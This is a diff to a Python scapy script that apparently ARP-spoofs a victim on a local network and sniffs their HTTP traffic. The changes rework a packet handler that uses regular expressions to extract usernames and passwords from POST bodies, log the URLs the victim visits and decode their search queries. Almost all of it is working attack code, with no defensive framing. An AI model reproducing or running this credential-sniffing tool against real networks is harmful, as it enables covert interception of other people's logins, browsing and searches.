@@ -13,7 +13,6 @@ import argparse
 import sys
 import os
 import signal
-import urlparse
 import commands
 bash=commands.getoutput
 
@@ -82,8 +81,10 @@ if ans:
 			if 'name_server' in x:
 				DNSsrvr = DHCPopt[idx][1]
 else:
-	print "No answer to DHCP packet sent to find the DNS server. Setting DNS server to router IP.\n"
-	DNSserver = routerIP
+	print "No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP.\n"
+	DNSsrvr = routerIP
+	DHCPsrvr = routerIP
+	localDomain = 'None'
 
 if args.ipaddress:
 	victimIP = args.ipaddress
@@ -93,8 +94,9 @@ else:
 		ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
 		print ips
 	victimIP = raw_input('\nType victim\'s IP: ')
+	print ''
 
-print "\n[+] Active interface: " + interface
+print "[+] Active interface: " + interface
 print "[+] Local IP: " + localIP
 print "[+] Interface MAC: " + localMAC
 print "[+] DHCP server: " + DHCPsrvr
@@ -118,8 +120,8 @@ def restore(routerIP, victimIP, routerMAC, victimMAC):
 	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
 
 def URL(pkt):
-#   Counter is to make sure we're not printing packet data twice if both username and password is found
-	counter = 0
+	global host, get, post, url
+
 	if pkt.haslayer(Raw) and pkt[Ether].src == victimMAC:
 		pkt = repr(pkt[Raw].load)
 		try:
@@ -128,71 +130,139 @@ def URL(pkt):
 			headers = pkt
 			body = ''
 
-		def search(url):
-			searched = re.search('((search|query|search\?q|\?s|&q)=([^&][^&]*))', url)
-			if searched:
-				searched = searched.group(3)
-				searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
-				print colors.BLUE + '[+] Searched %s for:' % c[1],searched + colors.ENDC
+		if args.post and len(headers) < 450 and not get:
+			username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
+			password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
+			if username != [] or password != []:
+				print colors.TAN+'[+] Packet may\'ve been split. Data:',body+colors.ENDC
+			if body != '':
+				for x in username:
+					for u in x:
+						if '=' in u:
+							print colors.RED+u+colors.ENDC
+				for y in password:
+					for p in y:
+						if '=' in p:
+							print colors.RED+p+colors.ENDC
+			else:
+				for x in username:
+					for u in x:
+						if '=' in u:
+							print colors.RED+u+colors.ENDC
+				for y in password:
+					for p in y:
+						if '=' in p:
+							print colors.RED+p+colors.ENDC
 
-		post = re.search('POST /', headers)
-		get = re.search('GET /', headers)
-		host = re.search('Host: ', headers)
+#			username = re.finditer('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
+#			password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
+#			for u in username:
+#				if u:
+#					print colors.TAN+'[+] Packet was split. Data:',headers+colors.ENDC
+#					print colors.RED+u.group()+colors.ENDC
+#					counter = 1
+#			for p in password:
+#				if p:
+#					if counter == 0:
+#						print colors.TAN+'[+] Packet was split. Data:', headers+colors.ENDC
+#					print colors.RED+p.group()+colors.ENDC
+#			if body != '':
+#			username = re.finditer('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
+#			password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
+#			for u in username:
+#				if u:
+#					print colors.TAN+'[+] Packet was split. Data:',headers+colors.ENDC
+#					print colors.RED+u.group()+colors.ENDC
+#					counter = 1
+#			for p in password:
+#				if p:
+#					if counter == 0:
+#						print colors.TAN+'[+] Packet was split. Data:', headers+colors.ENDC
+#					print colors.RED+p.group()+colors.ENDC
+#			counter = 0
+
+		headLines = headers.split(r"\r\n")
+		for l in headLines:
+			searchHost = re.search('[Hh]ost: ', l)
+			searchGet = re.search('GET /', l)
+			searchPost = re.search('POST /', l)
+			if searchHost:
+				host = l.split(' ')
+				host = host[1]
+			if searchGet:
+				get = l.split(' ')
+				get = get[1]
+			if searchPost:
+				post = l.split(' ')
+				post = post[1]
+
+		if host and get:
+			url = host+get
+		if host and post:
+			url = host+post
+		if url == None:
+			return
+
+#				b = a[0].split(" ")
+#				c = a[1].split(" ")
+#				url = c[1]+b[1]
+#		post = re.search('POST /', headers)
+#		get = re.search('GET /', headers)
+#		getRe = re.compile('GET /')
+#		get = getRe.search(headers)
+#		hostRe = re.compile('[Hh]ost: ')
+#		host = hostRe.search(headers)
+#		host = re.search('[Hh]ost: ', headers)
 
 #The big unsolvable problem is that sometimes sniff() will get a packet (usually from the arp spoofed victim)
 #and split it into 2 packets when wireshark sees only one. Consistently from neopets via arpspoof victim. The load
 #gets truncated and sniff() then treats the other few lines of the HTTP load as a new packet for some reason.
 #http://bpaste.net/show/v2CsP4Ixzb7NGGuutDSp/
-		if args.post and len(headers) < 450 and not get:
-			username = re.finditer('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
-			password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
-			for u in username:
-				if u:
-					print colors.TAN+'[+] Packet was split. Data:',headers+colors.ENDC
-					print colors.RED+u.group()+colors.ENDC
-					counter = 1
-			for p in password:
-				if p:
-					if counter == 0:
-						print colors.TAN+'[+] Packet was split. Data:', headers+colors.ENDC
-					print colors.RED+p.group()+colors.ENDC
-			counter = 0
-		if (post or get) and host:
-			a = headers.split(r"\r\n")
-			try:
-				b = a[0].split(" ")
-				c = a[1].split(" ")
-				url = c[1]+b[1]
-			except:
-				print "Could not form url"
+
+		if args.post and post:
+			if body != '':
+				print colors.TAN+'[+] POST:',url,'HTTP POST load:',body+colors.ENDC
+				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
+				password = re.findall('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
+				for x in username:
+					for u in x:
+						if '=' in u:
+							print colors.RED+u+colors.ENDC
+				for y in password:
+					for p in y:
+						if '=' in p:
+							print colors.RED+p+colors.ENDC
+
+		if args.urlspy:
+			d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
+			if any(i in url for i in d):
 				return
-			if args.post and post:
-				if body != '':
-					print colors.TAN+'[+] POST:',url,'HTTP POST load:',body+colors.ENDC
-					password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
-					username = re.finditer('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
-					for u in username:
-						if u:
-							print colors.RED,u.group(),colors.ENDC
-					for p in password:
-						if p:
-							print colors.RED,p.group(),colors.ENDC
-			if args.urlspy:
-				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
-				if any(i in url for i in d):
-					return
-				if len(url) > 150:
-					print url[:149]
-				else:
-					print url
-			if args.verboseURL:
+			if len(url) > 150:
+				print url[:149]
+			else:
 				print url
-			if args.search:
-				searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords)=([^&][^&]*))', url)
-				if searched:
-					searched = searched.group(3)
-					searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
-					print colors.BLUE + '[+] Searched %s for:' % c[1],searched + colors.ENDC
+
+		if args.verboseURL:
+			print url
+
+		if args.search:
+			searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords)=([^&][^&]*))', url)
+			if searched:
+				searched = searched.group(3)
+				searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
+				print colors.BLUE + '[+] Searched %s for:' % host,searched + colors.ENDC
+
+	host = None
+	get = None
+	post = None
+	url = None
+
+#def search(url):
+#	searched = re.search('((search|query|search\?q|\?s|&q)=([^&][^&]*))', url)
+#	if searched:
+#		searched = searched.group(3)
+#		searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
+#		print colors.BLUE + '[+] Searched %s for:' % c[1],searched + colors.ENDC
 
 def DNSreq(pkt):
 	if pkt.haslayer(DNSQR):
